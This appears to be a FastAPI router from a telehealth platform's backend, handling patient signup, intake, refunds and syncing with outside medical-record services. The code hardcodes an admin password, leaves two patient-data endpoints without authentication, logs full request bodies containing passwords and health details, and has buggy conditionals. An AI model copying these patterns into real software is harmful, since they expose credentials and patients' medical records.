import copy
import base64
import logging
import os
import secrets
import subprocess
from typing import Union, Optional

import requests
import stripe
from config import *
from db_client import DBClient
from drchrono import drchrono
from helpers.herlper_methods import add_signature_to_pdf, upload_file_to_s3
from models.event_members import EventMembers, EventMembersPostSchema, EventMembersGetResponseSchema
from models.intake_form import IntakeFormGetResponseSchema, IntakeForm, IntakeFormPostSchema, IntakeFormSaverPostSchema, \
    IntakeFormSaver
from models.social_events import SocialEventsSchema, SocialEvents, SocialEventsGetResponseSchema
from spreadsheet import spreadsheet
from fastapi import APIRouter, Depends, Request, BackgroundTasks, HTTPException, status, Response
from fastapi import File, Form, UploadFile
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from healthie import healthie
from mdintegrations import mdintegrations_api
from pydantic import BaseModel
from stripe_api import update_subscription
from datetime import datetime
from auth.cognito import cognito_change_email, cognito_change_phone, cognito_client
from auth.cognito import cognito_signup_apple_pay_user, cognito_signup_patient
from auth.jwk_model import get_current_user
from bg_task.mdi_tasks import mdi_attach_pharmacy_to_patient
from models.patient_weight import PatientWeight, PatientWeightSchema
from sqlalchemy_db import get_db
from sqlalchemy.orm import Session
from celery_service.tasks import update_patient_data
from celery_service.celery_service import CELERY_APP
from sqlalchemy import desc
from PIL import Image
import pillow_heif
import uuid
from helpers.utils import validate_email
from utils import download_s3_file

logger = logging.getLogger("fastapi")
router = APIRouter()

security = HTTPBasic()
stripe.api_key = STRIPE_API_KEY


def get_basic_username(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, "admin")
    correct_password = secrets.compare_digest(
        credentials.password, "_Adm!n@nextmed@123_")
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username


@router.get("/test", tags=["user"])
async def test(username: str = Depends(get_current_user)):
    return {"username": username}


@router.post('/get-patient-info', tags=["user"])
async def get_patient_info_endpoint(request: Request, email: str = Depends(get_current_user)):
    try:
        logger.info("API: get-patient-info")
        data = await request.json()
        logger.debug(data)
        client = DBClient()
        if email is None:
            result = client.get_patient_info(data.get("email"))
        else:
            result = client.get_patient_info(email)

        return result
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/get-patient-profile', tags=["user"])
async def get_patient_profile_endpoint(request: Request):
    try:
        logger.info("API: get-patient-profile")
        data = await request.json()
        logger.debug(data)
        client = DBClient()
        email = data.get("email")
        if email is None:
            return {"status": "success", "data": {}}
        else:
            result = client.get_patient_profile(email)

        return result
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/get-pid-data', tags=["user"])
async def get_pid_data_endpoint(request: Request):
    try:
        logger.info("API: get-pid-data")
        data = await request.json()
        logger.debug(data)
        client = DBClient()
        pid = data.get("pid")
        if pid is None:
            return {"status": "success", "data": {}}
        else:
            result = client.get_gen_pid_data(pid)

        return result
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/register', tags=["user"])
async def register_endpoint(request: Request):
    logger.info("API: register")
    try:
        data = await request.json()
        logger.debug(data)
        email_id = data.get('email')
        phone = data.get('phone')
        if data.get('userPayType') == "applePay":
            logger.debug(f"{email_id} is applePay.")
            result = cognito_signup_apple_pay_user(email_id, "", phone)
        else:
            password = data.get('password')
            result = cognito_signup_patient(email_id, password, phone)
        return {"status": "success", "temp_password": result}
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/add-new-patient', tags=["user"])
async def consumer_add_endpoint(request: Request):
    logger.info("API: add-new-patient")
    try:
        data = await request.json()
        logger.debug(data)
        user_data = data["user_data"]
        consumer_data = data["consumer_data"]
        email_id = user_data['email']
        phone = user_data['phone']
        password = user_data['password']
        payment_id = consumer_data[0]["payment_id"]
        client = DBClient()
        result = cognito_signup_patient(email_id, password, phone)
        if result:
            for patient in consumer_data:
                xx = client.consumer_add_patient(
                    patient["visit_date"],
                    patient["visit_month"],
                    patient["visit_year"],
                    patient["patient_name"],
                    patient["phone"],
                    patient["address"],
                    patient["current_date"],
                    patient["current_month"],
                    patient["current_year"],
                    patient["current_time"],
                    patient["nurse_time"],
                    patient["nurse_email"],
                    patient["apartment_number"],
                    "",
                    patient["receipt_email"],
                    patient["dob_month"],
                    patient["dob_date"],
                    patient["dob_year"],
                    patient["sex"],
                    "",
                    str(patient["care_option_text"]),
                    0,
                    "2020-01-01 10:10:10",
                    patient["card_token"],
                    patient["payment_id"],
                    patient["zip_code"],
                    0,
                    patient["is_hiv"],
                    patient["doctor_email"],
                    patient["location"],
                    patient["patient_symptoms"],
                    patient["axle_patient"],
                    patient["axle_address"],
                    patient["provider"],
                    patient["is_insurance"],
                    patient["lab_fax"],
                    patient["price"],
                    patient["test_type"],
                    patient["insuranceAmt"],
                    patient["insurance"],
                    patient["region_no"],
                    patient["customer_id"],
                    patient["patient_id_md"],
                    patient["patient_id"],
                    patient["path"],
                    patient["subscription_id"],
                    patient["subscription"],
                    patient["coupon"],
                    patient["total_price"],
                    patient["height"],
                    patient["weight"],
                    patient["airtable_id"],
                    patient["consent"],
                    patient["order_test_id"],
                    patient["total_discount"],
                    patient["referrer"],
                    patient["agent_name"])
        if xx != "failed":
            return {"status": "success", "mrn": xx}
        else:
            return {"status": "no nurse", "error": "no nurses available"}

    except Exception as e:
        refund = stripe.Refund.create(
            payment_intent=payment_id),

        return {"status": "failed", "error": str(e)}


@router.post('/add-new-customer', tags=["user"])
async def consumer_add_endpoint(request: Request):
    logger.info("API: add-new-customer")
    try:
        data = await request.json()
        logger.debug(data)
        user_data = data["user_data"]
        consumer_data = data["consumer_data"]
        email_id = user_data['email']
        phone = user_data['phone']
        password = user_data['password']
        payment_id = consumer_data[0]["payment_id"]
        client = DBClient()
        for patient in consumer_data:
            xx = client.consumer_add_patient(
                patient["visit_date"],
                patient["visit_month"],
                patient["visit_year"],
                patient["patient_name"],
                patient["phone"],
                patient["address"],
                patient["current_date"],
                patient["current_month"],
                patient["current_year"],
                patient["current_time"],
                patient["nurse_time"],
                patient["nurse_email"],
                patient["apartment_number"],
                "",
                patient["receipt_email"],
                patient["dob_month"],
                patient["dob_date"],
                patient["dob_year"],
                patient["sex"],
                "",
                str(patient["care_option_text"]),
                0,
                "2020-01-01 10:10:10",
                patient["card_token"],
                patient["payment_id"],
                patient["zip_code"],
                0,
                patient["is_hiv"],
                patient["doctor_email"],
                patient["location"],
                patient["patient_symptoms"],
                patient["axle_patient"],
                patient["axle_address"],
                patient["provider"],
                patient["is_insurance"],
                patient["lab_fax"],
                patient["price"],
                patient["test_type"],
                patient["insuranceAmt"],
                patient["insurance"],
                patient["region_no"],
                patient["customer_id"],
                patient["patient_id_md"],
                patient["patient_id"],
                patient["path"],
                patient["subscription_id"],
                patient["subscription"],
                patient["coupon"],
                patient["total_price"],
                patient["height"],
                patient["weight"],
                patient["airtable_id"],
                patient["consent"],
                patient["order_test_id"],
                patient["total_discount"],
                patient["referrer"])

        if xx != "failed":
            result = cognito_signup_patient(email_id, password, phone)
            if result:
                return {"status": "success", "mrn": xx}
        else:
            return {"status": "no nurse", "error": "no nurses available"}

    except Exception as e:
        refund = stripe.Refund.create(
            payment_intent=payment_id),

        return {"status": "failed", "error": str(e)}


def _update_stripe_subscription_(subscription_id, patient_id_md, case_id, refills_ordered=1):
    """Update stripe subscription for refill count & new case id"""
    try:
        if subscription_id is None:
            logger.warning(
                f"Not Updating stripe subscription: {subscription_id}")
            return

        logger.info(f"Updating stripe subscription: {subscription_id} with "
                    f"patient_id_md: {patient_id_md},"
                    f"case_id: {case_id} & refills_ordered: {refills_ordered}")
        metadata = {
            "patient_id_md": patient_id_md,
            "case_id": case_id,
            "refills_ordered": refills_ordered
        }
        update_subscription(subscription_id, metadata=metadata)

    except Exception as e:
        logger.exception(e)


def add_pharmacy(data, background_tasks: BackgroundTasks):
    """Update stripe subscription for refill count & new case id"""
    try:
        background_tasks.add_task(mdi_attach_pharmacy_to_patient, data)

        return {"status": "success", "message": "Pharmacy being attached in background."}

    except Exception as e:
        logger.exception(e)


# @router.post('/update-patient-data', tags=["user"])
# async def update_patient_data_endpoint(request: Request):
#     data = await request.json()
#     email_id = data.get('email')
#     case_data = data["case_data"]
#     dr_chrono_data = data["dr_chrono_data"]
#     dr_chrono_task_data = data["dr_chrono_task_data"]
#     dr_chrono_appointment_data = data["dr_chrono_appointment_data"]
#     md_data = data["md_data"]
#     profile_data = data["profile_data"]
#     ins_data = data["ins_data"]
#     client = DBClient()
#     case_id = ""
#     count = 0
#     patient_md = ""
#     patient_dr = ""
#     try:
#         if count == 0:
#             if "test_type" in profile_data:
#                 md_data["test_type"]= profile_data["test_type"]
#                 case_data["test_type"]= profile_data["test_type"]
#             md_patient = mdintegrations_api.create_patient(md_data)
#             if 'patient_id' in md_patient:
#                 subscription_id = None
#                 patient_md = md_patient["patient_id"]
#                 if 'subscription_id' in case_data:
#                     subscription_id = case_data['subscription_id']
#                     del case_data['subscription_id']
#                 case_data["patient_id"] = md_patient["patient_id"]
#                 if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data["test_name"] == "GLP-1 Weight Loss Program"or profile_data["test_name"] == "Accutane Acne Program"or profile_data["test_name"] == "Accutane Acne Complete Program":
#                     for question in case_data["case_questions"]:
#                         add_question = client.create_question(
#                                 question["question"], question["answer"], profile_data["mrn"], case_id, patient_md, profile_data["pharmacy_id"])
#                 else:
#                     create_md_case = mdintegrations_api.create_case(case_data)
#                     logger.debug(create_md_case)
#                     if 'case_id' in create_md_case:
#                         case_id = create_md_case["case_id"]
#                         _update_stripe_subscription_(
#                             subscription_id, md_patient['patient_id'], create_md_case['case_id'], refills_ordered=1)
#             drchorno_patient = drchrono.patient_create(dr_chrono_data)
#             if 'id' in drchorno_patient:
#                 patient_dr = drchorno_patient["id"]
#                 dr_chrono_appointment_data["patient"] = drchorno_patient["id"]
#                 res_apt = drchrono.appointment_create(
#                     dr_chrono_appointment_data)
#                 ins_data["patient_id"] = drchorno_patient["id"]
#                 dr_chrono_task_data["associated_items"] = [
#                     {"type": "Patient", "value": drchorno_patient["id"]}]
#                 task_res = drchrono.tasks_create(dr_chrono_task_data)
#                 update_ins = drchrono.patient_partial_update(ins_data)
#             result = client.edit_patient_profile_new(profile_data["mrn"], profile_data["patient_name"], profile_data["insurance"], profile_data["pharmacy"], profile_data["patient_address"], profile_data["dob_date"], profile_data["dob_month"], profile_data["dob_year"], profile_data["sex"], profile_data['height'], profile_data['weight'], profile_data["current_medications"], profile_data["allergies"], profile_data['region_no'], patient_md, patient_dr, profile_data["is_user_verified"], profile_data["mobile"], profile_data["symptoms"], profile_data["cartQuestion"], profile_data["teleHealth"], profile_data["primaryDoc"], profile_data["insurance_payer_id"], profile_data["is_pregnent"], profile_data["isAppleUser"], profile_data["img_doc"], profile_data["agreement"], profile_data["apartment_number"], profile_data["address"], profile_data["pharmacy_ins_patient"], case_id, profile_data["zip_code"],profile_data["pharmacy_id"],profile_data["about_us"],profile_data["sexual_partner"],profile_data["contrave_issues"],profile_data["testName"])
#             count = count + 1
#             return result

#     except Exception as e:
#         logger.exception(e)
#         return {"status": "failed", "error": str(e)}


@router.post('/update-patient-data-fake', tags=["user"])
async def update_patient_data_endpoint(request: Request):
    logger.info("API: update-patient-data-fake")
    try:
        data = await request.json()
        email_id = data.get('email')
        case_data = data["case_data"]
        dr_chrono_data = data["dr_chrono_data"]
        dr_chrono_task_data = data["dr_chrono_task_data"]
        dr_chrono_appointment_data = data["dr_chrono_appointment_data"]
        md_data = data["md_data"]
        healthie_data = data["healthie_data"]
        profile_data = data["profile_data"]
        ins_data = data["ins_data"]
        client = DBClient()
        case_id = ""
        count = 0
        patient_md = ""
        healthie_id = ""
        patient_dr = ""
        mdintegration_patient_created = False
        questions_created = False
        mdintegration_case_created = False
        drchrono_patient_created = False
        drchrono_appointment_created = False
        drchrono_task_created = False
        drchrono_request_log_status = client.add_drchrono_request_log(copy.deepcopy(data), ENV)

        if count == 0:
            if "test_type" in profile_data:
                md_data["test_type"] = profile_data["test_type"]
                case_data["test_type"] = profile_data["test_type"]
            find_patient = client.get_patient_visits(email_id)
            patient_all_data = find_patient["data"]
            for patient in patient_all_data:
                if patient["patient_id_md"] not in [None, "None", ""]:
                    patient_md = patient["patient_id_md"]
                    break
            logger.debug(patient_md)
            if patient_md == "":
                try:
                    md_patient = mdintegrations_api.create_patient(md_data)
                    mdintegration_patient_created = True
                except Exception as e:
                    mdintegration_patient_created = False
                    md_patient = {}
                    logger.exception("md integration => patient not created: " + str(e))
                if 'patient_id' in md_patient:
                    logger.debug(md_patient["patient_id"])
                    subscription_id = None
                    patient_md = md_patient["patient_id"]
                    if 'subscription_id' in case_data:
                        subscription_id = case_data['subscription_id']
                        del case_data['subscription_id']
                    case_data["patient_id"] = md_patient["patient_id"]
                    if profile_data["test_name"] in [
                        "GLP-1 Weight Loss Complete Program",
                        "GLP-1 Weight Loss Program",
                        "Accutane Acne Program",
                        "Accutane Acne Complete Program",
                        "Contrave Weight Loss Program"
                    ]:
                        for question in case_data["case_questions"]:
                            try:
                                client.create_question(
                                    question["question"], question["answer"], profile_data["mrn"], case_id, patient_md,
                                    profile_data["pharmacy_id"]
                                )
                                questions_created = True
                            except Exception as e:
                                questions_created = False
                                logger.exception("create question => question not created: " + str(e))
                    else:
                        try:
                            create_md_case = mdintegrations_api.create_case(case_data)
                            mdintegration_case_created = True
                        except Exception as e:
                            create_md_case = {}
                            mdintegration_case_created = False
                            logger.exception("create case => case not created: " + str(e))
                        logger.debug(create_md_case)
                        if 'case_id' in create_md_case:
                            logger.debug(create_md_case["case_id"])
                            case_id = create_md_case["case_id"]
                            try:
                                _update_stripe_subscription_(
                                    subscription_id, md_patient['patient_id'],
                                    create_md_case['case_id'], refills_ordered=1
                                )
                            except Exception as e:
                                logger.exception(
                                    "update stripe subscription => stripe subscription not updated: " + str(e)
                                )
            else:
                logger.debug("else value")
                logger.debug(patient_md)
                subscription_id = None
                if 'subscription_id' in case_data:
                    subscription_id = case_data['subscription_id']
                    del case_data['subscription_id']
                case_data["patient_id"] = patient_md
                if profile_data["test_name"] in [
                    "GLP-1 Weight Loss Complete Program",
                    "GLP-1 Weight Loss Program",
                    "Accutane Acne Program",
                    "Accutane Acne Complete Program",
                    "Contrave Weight Loss Program"
                ]:
                    logger.debug("non one time test")
                    for question in case_data["case_questions"]:
                        try:
                            client.create_question(
                                question["question"], question["answer"], profile_data["mrn"], case_id,
                                patient_md, profile_data["pharmacy_id"]
                            )
                            questions_created = True
                        except Exception as e:
                            questions_created = False
                            logger.exception("create question => question not created: " + str(e))
                else:
                    try:
                        create_md_case = mdintegrations_api.create_case(case_data)
                        mdintegration_case_created = True
                    except Exception as e:
                        create_md_case = {}
                        mdintegration_case_created = False
                        logger.exception("md integration => patient not created: " + str(e))
                    logger.debug(create_md_case)
                    if 'case_id' in create_md_case:
                        logger.debug(create_md_case["case_id"])
                        case_id = create_md_case["case_id"]
                        try:
                            _update_stripe_subscription_(
                                subscription_id, patient_md, create_md_case['case_id'], refills_ordered=1
                            )
                        except Exception as e:
                            logger.exception("update stripe subscription => stripe subscription not updated: " + str(e))
            try:
                drchrono_patient = drchrono.patient_create(dr_chrono_data)
                drchrono_patient_created = True
                client.update_drchrono_request_log_processed(
                    drchrono_request_log_status['record_id'],
                    processed=1
                )
            except Exception as e:
                drchrono_patient = {}
                drchrono_patient_created = False
                logger.exception("drchrono create patient => patient not created: " + str(e))
            if 'id' in drchrono_patient:
                patient_dr = drchrono_patient["id"]
                dr_chrono_appointment_data["patient"] = drchrono_patient["id"]
                try:
                    drchrono.appointment_create(dr_chrono_appointment_data)
                    drchrono_appointment_created = True
                except Exception as e:
                    drchrono_appointment_created = False
                    logger.exception("drchrono create appointment => appointment not created: " + str(e))
                ins_data["patient_id"] = drchrono_patient["id"]
                dr_chrono_task_data["associated_items"] = [{"type": "Patient", "value": drchrono_patient["id"]}]
                try:
                    drchrono.tasks_create(dr_chrono_task_data)
                    drchrono_task_created = True
                except Exception as e:
                    drchrono_task_created = False
                    logger.exception("drchrono create task => task not created: " + str(e))
                try:
                    drchrono.patient_partial_update(ins_data)
                except Exception as e:
                    logger.exception("drchrono update partial patient => patient not updated: " + str(e))

            if profile_data["test_name"] in ["GLP-1 Weight Loss Complete Program", "GLP-1 Weight Loss Program"]:
                try:
                    healthie_patient = healthie.create_patient_all_in_one(healthie_data)
                except Exception as e:
                    healthie_patient = {}
                    logger.exception("healthie create patient => patient not created: " + str(e))
                if healthie_patient:
                    user = healthie_patient["data"]["createClient"]["user"]
                else:
                    user = {}
                if "speard_data" in data:
                    try:
                        spreadsheet.write_spreadsheet_data(data["speard_data"])
                    except Exception as e:
                        logger.exception("spreadsheet write => spreadsheet not written: " + str(e))
                if user and "id" in user:
                    healthie_id = user["id"]
                    healthie_data["user_id"] = user["id"]
                    healthie_data["rel_user_id"] = user["id"]
                    healthie.upload_document_all_in_one(healthie_data)
                    healthie_data["id"] = user["id"]
                    healthie.update_patient_all_in_one(healthie_data)
                    try:
                        client.update_healthie(email_id)
                    except Exception as e:
                        logger.exception("healthie update => healthie not updated: " + str(e))
            result = client.edit_patient_profile_new_fake(
                profile_data["mrn"], profile_data["patient_name"],
                profile_data["insurance"],
                profile_data["pharmacy"],
                profile_data["patient_address"],
                profile_data["dob_date"],
                profile_data["dob_month"],
                profile_data["dob_year"],
                profile_data["sex"],
                profile_data['height'],
                profile_data['weight'],
                profile_data["current_medications"],
                profile_data["allergies"],
                profile_data['region_no'],
                patient_md,
                patient_dr,
                profile_data["is_user_verified"],
                profile_data["mobile"],
                profile_data["symptoms"],
                profile_data["cartQuestion"],
                profile_data["teleHealth"],
                profile_data["primaryDoc"],
                profile_data["insurance_payer_id"],
                profile_data["is_pregnent"],
                profile_data["isAppleUser"],
                profile_data["img_doc"],
                profile_data["agreement"],
                profile_data["apartment_number"],
                profile_data["address"],
                profile_data["pharmacy_ins_patient"],
                case_id,
                profile_data["zip_code"],
                profile_data["pharmacy_id"],
                profile_data["about_us"],
                profile_data["sexual_partner"],
                profile_data["contrave_issues"],
                profile_data["testName"],
                healthie_id,
                profile_data["insurance_flag"],
                profile_data["tried_metformin"],
                profile_data["plan"],
                profile_data["patient_test_type"]
            ) or {}
            count = count + 1
            result["mdintegration_patient_created"] = mdintegration_patient_created
            result["questions_created"] = questions_created
            result["mdintegration_case_created"] = mdintegration_case_created
            result["drchrono_patient_created"] = drchrono_patient_created
            result["drchrono_appointment_created"] = drchrono_appointment_created
            result["drchrono_task_created"] = drchrono_task_created
            return result
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


@router.post('/update-patient-data', tags=["user"])
async def update_patient_data_endpoint(request: Request):
    logger.info("API: update-patient-data")
    response = {'task_id': None}
    try:
        data = await request.json()
        if not data:
            raise Exception('JSON field can not be empty')
        response['task_id'] = update_patient_data.delay(data).id
    except Exception as e:
        response['error'] = str(e)
    finally:
        return response


@router.post('/celery-task-info', tags=["user"])
async def return_celery_result(request: Request):
    logger.info("API: celery-task-info")
    response = {"error": None}
    try:
        data = await request.json()
        if not data:
            raise Exception('data field can not be empty')
        task_id = data.get('task_id')
        if not task_id:
            raise Exception('task_id is required')
        result_ = CELERY_APP.AsyncResult(task_id)
        response = {"status": result_.status, "result": result_.result, "task_id": task_id}
    except Exception as e:
        response['error'] = str(e)
    finally:
        return response


@router.post('/update-patient-data-new', tags=["user"])
async def update_patient_data_endpoint(request: Request):
    logger.info("API: update-patient-data-new")
    try:
        data = await request.json()
        email_id = data.get('email')
        case_data = data["case_data"]
        dr_chrono_data = data["dr_chrono_data"]
        dr_chrono_task_data = data["dr_chrono_task_data"]
        dr_chrono_appointment_data = data["dr_chrono_appointment_data"]
        md_data = data["md_data"]
        healthie_data = data["healthie_data"]
        profile_data = data["profile_data"]
        ins_data = data["ins_data"]
        client = DBClient()
        case_id = ""
        count = 0
        patient_md = ""
        healthie_id = ""
        patient_dr = ""
        if count == 0:
            if "test_type" in profile_data:
                md_data["test_type"] = profile_data["test_type"]
                case_data["test_type"] = profile_data["test_type"]
            find_patient = client.get_patient_visits(email_id)
            patient_all_data = find_patient["data"]
            len_patient_data = len(patient_all_data)
            if len_patient_data > 0:
                for patient in patient_all_data:
                    if patient["patient_id_md"] != None or patient["patient_id_md"] != "None" or patient[
                        "patient_id_md"] != "":
                        patient_md = patient["patient_id_md"]
                        break;
            logger.debug(patient_md)
            if patient_md == "":
                md_patient = mdintegrations_api.create_patient(md_data)
                if 'patient_id' in md_patient:
                    logger.debug(md_patient["patient_id"])
                    subscription_id = None
                    patient_md = md_patient["patient_id"]
                    if 'subscription_id' in case_data:
                        subscription_id = case_data['subscription_id']
                        del case_data['subscription_id']
                    case_data["patient_id"] = md_patient["patient_id"]
                    if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data[
                        "test_name"] == "GLP-1 Weight Loss Program" or profile_data[
                        "test_name"] == "Accutane Acne Program" or profile_data[
                        "test_name"] == "Accutane Acne Complete Program":
                        for question in case_data["case_questions"]:
                            add_question = client.create_question(
                                question["question"], question["answer"], profile_data["mrn"], case_id, patient_md,
                                profile_data["pharmacy_id"])
                    else:
                        create_md_case = mdintegrations_api.create_case(case_data)
                        logger.debug(create_md_case)
                        if 'case_id' in create_md_case:
                            logger.debug(create_md_case["case_id"])
                            case_id = create_md_case["case_id"]
                            _update_stripe_subscription_(
                                subscription_id, md_patient['patient_id'], create_md_case['case_id'], refills_ordered=1)
            else:
                logger.debug("else value")
                logger.debug(patient_md)
                subscription_id = None
                if 'subscription_id' in case_data:
                    subscription_id = case_data['subscription_id']
                    del case_data['subscription_id']
                case_data["patient_id"] = patient_md
                if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data[
                    "test_name"] == "GLP-1 Weight Loss Program" or profile_data[
                    "test_name"] == "Accutane Acne Program" or profile_data[
                    "test_name"] == "Accutane Acne Complete Program":
                    logger.debug("non one time test")
                    for question in case_data["case_questions"]:
                        add_question = client.create_question(
                            question["question"], question["answer"], profile_data["mrn"], case_id, patient_md,
                            profile_data["pharmacy_id"])
                else:
                    create_md_case = mdintegrations_api.create_case(case_data)
                    logger.debug(create_md_case)
                    if 'case_id' in create_md_case:
                        logger.debug(create_md_case["case_id"])
                        case_id = create_md_case["case_id"]
                        _update_stripe_subscription_(
                            subscription_id, patient_md, create_md_case['case_id'], refills_ordered=1)

            drchorno_patient = drchrono.patient_create(dr_chrono_data)
            if 'id' in drchorno_patient:
                patient_dr = drchorno_patient["id"]
                dr_chrono_appointment_data["patient"] = drchorno_patient["id"]
                res_apt = drchrono.appointment_create(
                    dr_chrono_appointment_data)
                ins_data["patient_id"] = drchorno_patient["id"]
                dr_chrono_task_data["associated_items"] = [{"type": "Patient", "value": drchorno_patient["id"]}]
                task_res = drchrono.tasks_create(dr_chrono_task_data)
                update_ins = drchrono.patient_partial_update(ins_data)
            if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data[
                "test_name"] == "GLP-1 Weight Loss Program":
                healthie_patient = healthie.create_patient(healthie_data)
                user = healthie_patient["data"]["createClient"]["user"]
                if "speard_data" in data:
                    sp_data = spreadsheet.write_spreadsheet_data(data["speard_data"])
                if "id" in user:
                    healthie_id = user["id"]
                    update_healthie = client.update_healthie(email_id)
            result = client.edit_patient_profile_new_fake(profile_data["mrn"], profile_data["patient_name"],
                                                          profile_data["insurance"], profile_data["pharmacy"],
                                                          profile_data["patient_address"], profile_data["dob_date"],
                                                          profile_data["dob_month"], profile_data["dob_year"],
                                                          profile_data["sex"], profile_data['height'],
                                                          profile_data['weight'], profile_data["current_medications"],
                                                          profile_data["allergies"], profile_data['region_no'],
                                                          patient_md, patient_dr, profile_data["is_user_verified"],
                                                          profile_data["mobile"], profile_data["symptoms"],
                                                          profile_data["cartQuestion"], profile_data["teleHealth"],
                                                          profile_data["primaryDoc"],
                                                          profile_data["insurance_payer_id"],
                                                          profile_data["is_pregnent"], profile_data["isAppleUser"],
                                                          profile_data["img_doc"], profile_data["agreement"],
                                                          profile_data["apartment_number"], profile_data["address"],
                                                          profile_data["pharmacy_ins_patient"], case_id,
                                                          profile_data["zip_code"], profile_data["pharmacy_id"],
                                                          profile_data["about_us"], profile_data["sexual_partner"],
                                                          profile_data["contrave_issues"], profile_data["testName"],
                                                          healthie_id, profile_data["insurance_flag"],
                                                          profile_data["tried_metformin"], )
            count = count + 1
            return result
    except Exception as e:
        logger.exception(e)
        return {"status": "failed", "error": str(e)}


# @router.post('/update-patient-data', tags=["user"])
# async def update_patient_data_endpoint(request: Request):
#     data = await request.json()
#     email_id = data.get('email')
#     case_data = data["case_data"]
#     dr_chrono_data = data["dr_chrono_data"]
#     dr_chrono_task_data = data["dr_chrono_task_data"]
#     dr_chrono_appointment_data = data["dr_chrono_appointment_data"]
#     md_data = data["md_data"]
#     healthie_data=data["healthie_data"]
#     profile_data = data["profile_data"]
#     ins_data = data["ins_data"]
#     client = DBClient()
#     case_id = ""
#     count = 0
#     patient_md = ""
#     healthie_id = ""
#     patient_dr = ""
#     try:
#         if count == 0:
#             if "test_type" in profile_data:
#                 md_data["test_type"]= profile_data["test_type"]
#                 case_data["test_type"]= profile_data["test_type"]
#             find_patient = client.get_patient_visits(email_id)
#             patient_all_data = find_patient["data"]
#             for patient in patient_all_data:
#                 if patient["patient_id_md"] != None or patient["patient_id_md"] != "None"  or patient["patient_id_md"] != "" :
#                     patient_md = patient["patient_id_md"]
#                     break;
#             logger.debug(patient_md)
#             if patient_md == "":
#                 md_patient = mdintegrations_api.create_patient(md_data)
#                 if 'patient_id' in md_patient:
#                     logger.debug(md_patient["patient_id"])
#                     subscription_id = None
#                     patient_md = md_patient["patient_id"]
#                     if 'subscription_id' in case_data:
#                         subscription_id = case_data['subscription_id']
#                         del case_data['subscription_id']
#                     case_data["patient_id"] = md_patient["patient_id"]
#                     case_data["case_services"] = [{"partner_service_id": "aadc5bce-10d5-4e5c-8f10-4e6d1f57b3b2"}]
#                     if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data["test_name"] == "GLP-1 Weight Loss Program"or profile_data["test_name"] == "Accutane Acne Program"or profile_data["test_name"] == "Accutane Acne Complete Program":
#                         for question in case_data["case_questions"]:
#                             add_question = client.create_question(
#                                     question["question"], question["answer"], profile_data["mrn"], case_id, patient_md, profile_data["pharmacy_id"])
#                     else:
#                         create_md_case = mdintegrations_api.create_case(case_data)
#                         logger.debug(create_md_case)
#                         if 'case_id' in create_md_case:
#                             logger.debug(create_md_case["case_id"])
#                             case_id = create_md_case["case_id"]
#                             _update_stripe_subscription_(
#                                 subscription_id, md_patient['patient_id'], create_md_case['case_id'], refills_ordered=1)
#             else:
#                 logger.debug("else value")
#                 logger.debug(patient_md)
#                 subscription_id = None
#                 if 'subscription_id' in case_data:
#                     subscription_id = case_data['subscription_id']
#                     del case_data['subscription_id']
#                 case_data["patient_id"] = patient_md
#                 case_data["case_services"] = [{"partner_service_id": "aadc5bce-10d5-4e5c-8f10-4e6d1f57b3b2"}]
#                 if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data["test_name"] == "GLP-1 Weight Loss Program"or profile_data["test_name"] == "Accutane Acne Program"or profile_data["test_name"] == "Accutane Acne Complete Program":
#                     logger.debug("non one time test")
#                     for question in case_data["case_questions"]:
#                             add_question = client.create_question(
#                                     question["question"], question["answer"], profile_data["mrn"], case_id, patient_md, profile_data["pharmacy_id"])
#                 else:
#                     create_md_case = mdintegrations_api.create_case(case_data)
#                     logger.debug(create_md_case)
#                     if 'case_id' in create_md_case:
#                         logger.debug(create_md_case["case_id"])
#                         case_id = create_md_case["case_id"]
#                         _update_stripe_subscription_(
#                                 subscription_id, patient_md, create_md_case['case_id'], refills_ordered=1)
#             drchorno_patient = drchrono.patient_create(dr_chrono_data)
#             if 'id' in drchorno_patient:
#                 patient_dr = drchorno_patient["id"]
#                 dr_chrono_appointment_data["patient"] = drchorno_patient["id"]
#                 res_apt = drchrono.appointment_create(
#                     dr_chrono_appointment_data)
#                 ins_data["patient_id"] = drchorno_patient["id"]
#                 dr_chrono_task_data["associated_items"] = [{"type": "Patient", "value": drchorno_patient["id"]}]
#                 task_res = drchrono.tasks_create(dr_chrono_task_data)
#                 update_ins = drchrono.patient_partial_update(ins_data)
#             if profile_data["test_name"] == "GLP-1 Weight Loss Complete Program" or profile_data["test_name"] == "GLP-1 Weight Loss Program":
#                 healthie_patient = healthie.create_patient(healthie_data)
#                 user = healthie_patient["data"]["createClient"]["user"]
#                 if "speard_data" in  data:
#                     sp_data = spreadsheet.write_spreadsheet_data(data["speard_data"])
#                 if "id" in user:
#                     healthie_id = user["id"]
#             result = client.edit_patient_profile_new_fake(profile_data["mrn"], profile_data["patient_name"], profile_data["insurance"], profile_data["pharmacy"], profile_data["patient_address"], profile_data["dob_date"], profile_data["dob_month"], profile_data["dob_year"], profile_data["sex"], profile_data['height'], profile_data['weight'], profile_data["current_medications"], profile_data["allergies"], profile_data['region_no'], patient_md, patient_dr, profile_data["is_user_verified"], profile_data["mobile"], profile_data["symptoms"], profile_data["cartQuestion"], profile_data["teleHealth"], profile_data["primaryDoc"], profile_data["insurance_payer_id"], profile_data["is_pregnent"], profile_data["isAppleUser"], profile_data["img_doc"], profile_data["agreement"], profile_data["apartment_number"], profile_data["address"], profile_data["pharmacy_ins_patient"], case_id, profile_data["zip_code"],profile_data["pharmacy_id"],profile_data["about_us"],profile_data["sexual_partner"],profile_data["contrave_issues"],profile_data["testName"],healthie_id)
#             count = count + 1
#             return result

